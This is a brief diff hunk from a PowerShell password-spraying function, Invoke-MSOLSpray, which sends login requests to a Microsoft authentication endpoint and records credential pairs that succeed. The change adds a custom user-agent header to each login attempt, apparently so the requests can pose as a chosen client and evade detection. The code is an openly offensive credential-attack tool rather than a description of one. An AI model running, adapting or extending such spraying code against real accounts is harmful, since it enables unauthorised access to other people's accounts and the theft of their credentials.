@@ -287,7 +287,7 @@ function Invoke-MSOLSpray {
                 }
                 Try {
                     $TimeOfRequest = Get-Date -Format o
-                    $LogonRequest = Invoke-WebRequest -Uri $AuthURL -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable ResponseError
+                    $LogonRequest = Invoke-WebRequest -Uri $AuthURL -Method Post -Headers $PostHeaders -Body $BodyParams -UserAgent $UserAgent -ErrorVariable ResponseError
                     If ($LogonRequest.StatusCode -eq "200") {
                         Write-Verbose "Found valid user credential. $($TimeOfRequest):$($Username):$($Password)"
                         $OutputObject += Add-InvokeMSOLOutputToObject -Time $TimeOfRequest -Username $Username -Password $Password -IsValid $true -ResponseError "None."
